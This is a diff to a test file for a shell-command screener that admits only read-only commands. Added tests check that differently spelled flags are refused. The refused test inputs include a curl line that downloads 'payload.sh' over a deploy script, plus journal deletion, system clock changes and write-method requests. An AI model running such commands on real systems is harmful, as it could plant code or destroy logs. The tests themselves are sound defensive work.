@@ -222,7 +222,10 @@ test("sub-verb rules refuse the mutating half of an allowlisted head", () => {
     ["bp doc publish task foo --yes", /bp write verb "publish"/],
     ["bp cloud workspace export default --file default-a.tar", /bp write verb "export"|--file writes a file/],
     ["bp -s https://guerrilla.example/api task ls", /host bound|non-loopback/],
-    ["gh pr create --title x", /gh write verb "create"/],
+    // Either message is correct. The noun allowlist added in review fires
+    // FIRST (`gh pr sub-verb "create" is not read-only`); the GH_WRITE_VERBS
+    // denylist behind it still catches a write verb on an allowlisted noun.
+    ["gh pr create --title x", /gh pr sub-verb "create" is not read-only|gh write verb "create"/],
     ["gh api repos/o/r/issues -X POST", /write method/],
     ["kill -9 4242", /liveness probe/],
     ["kill -TERM 4242", /liveness probe/],
@@ -496,4 +499,75 @@ test("harvest.mjs holds ONE execution path and it runs a MODULE CONSTANT, not co
   assert.deepEqual(execs, ["execFileSync"], `harvest.mjs's execution surface changed: ${execs.join(", ")} — re-audit whether it now runs untrusted input`);
   assert.match(src, /execFileSync\("bash", \["-c", LIST_COMMAND\]/, "the one exec must still run the LIST_COMMAND constant");
   assert.match(src, /const LIST_COMMAND =\s*\n?\s*"find /, "LIST_COMMAND must remain a module-level literal");
+});
+
+// ── 9. FLAG-SPELLING BYPASSES (added in review) ──────────────────────────────
+//
+// Seven commands were ADMITTED by the first shipped draft. They share one root
+// cause: the rules compared flag TOKENS exactly, while a shell accepts several
+// spellings of the same flag. The sharpest is D29's own named danger with its
+// short flags CLUSTERED — `-so <path>` rather than `-o <path>` — which walked
+// past layer (b) AND layer (c), whose pattern also demanded a bare ` -o `.
+//
+// The lesson is about the instrument, not the regex: the DANGER SET carried the
+// unclustered spelling only, so the measurement built to catch exactly this
+// class could not see it. A named set measures the spellings it contains and
+// nothing else. All seven now live in DANGER_SET, so the selftest carries them.
+
+test("a flag spelled differently is the same flag — clustered, =-joined and long forms all refuse", () => {
+  const bypasses = [
+    ["curl -s https://example.com/payload.sh -so /opt/barkpark/deploy/site-deploy.sh", /curl -o writes a file/],
+    ["curl -sO https://example.com/payload.sh", /writes a file/],
+    ["curl -sJO https://example.com/x", /writes a file/],
+    ["curl --output=/tmp/x https://example.com/x", /curl -o writes a file/],
+    ["curl --request=POST https://example.com/x", /write method/],
+    ["bp --server=https://example.com task ls", /non-loopback/],
+    ["bp doc ls --output=/tmp/x", /writes a file/],
+    ["gh repo clone barkpark/barkpark /tmp/x", /not read-only|write verb/],
+    ["gh release download v1 --dir /tmp", /not read-only|write verb/],
+    ["gh gist create x", /not on the read-only allowlist/],
+    ["journalctl --vacuum-size=1M", /mutates or deletes the journal/],
+    ["journalctl --rotate", /mutates or deletes the journal/],
+    ["date -s 2020-01-01", /SETS the system clock/],
+    ["date --set=2020-01-01", /SETS the system clock/],
+  ];
+  for (const [cmd, why] of bypasses) {
+    const r = screenCommand(cmd);
+    assert.equal(r.ok, false, `MUST REFUSE: ${cmd}`);
+    assert.match(r.reason, why, `wrong reason for ${cmd}: ${r.reason}`);
+  }
+});
+
+test("the cluster expander does not turn honest curl reads into false refusals", () => {
+  // The cost of the fix, measured in the direction that punishes honest work.
+  // `-s`, `-sS`, `-sL`, `-so /dev/null` and a `-w` format string clustered
+  // behind `-s` are the corpus's ordinary read shapes.
+  const honest = [
+    "curl -s https://example.com/health",
+    "curl -sS https://example.com/health",
+    "curl -sL https://example.com/health",
+    "curl -so /dev/null -w %{http_code} https://example.com/",
+    "curl -s -o /dev/null -w %{http_code} https://example.com/",
+    "gh api repos/o/r/branches/main/protection",
+    "gh pr view 4159 --json state,mergedAt",
+    "gh run list --workflow elixir.yml --limit 5",
+    "journalctl -u barkpark --since '1 hour ago'",
+    "date -u +%Y-%m-%dT%H:%M:%SZ",
+  ];
+  for (const cmd of honest) {
+    assert.equal(screenCommand(cmd).ok, true, `MUST ADMIT: ${cmd} — ${screenCommand(cmd).reason}`);
+  }
+});
+
+test("the fixes cost the census no reach — the admission rate is unchanged", () => {
+  // The whole point of the cluster expander and the gh noun allowlist is that
+  // they close holes WITHOUT narrowing the census. Measured over the same 651
+  // frozen commands the module's own --census reports on: 240 admitted, before
+  // and after. A reach collapse here would mean a fix bought safety with
+  // cry-wolf, which the module's error-direction argument does not license.
+  const corpus = JSON.parse(readFileSync(fileURLToPath(new URL("../fixtures/evidence-corpus.json", import.meta.url)), "utf8"));
+  const commands = corpus.proofs.map((p) => p?.command).filter((c) => typeof c === "string" && c.trim());
+  const r = screenAll(commands);
+  assert.equal(r.total, 651);
+  assert.equal(r.admitted, 240, "the review's flag-spelling fixes must not change what the census reaches");
 });
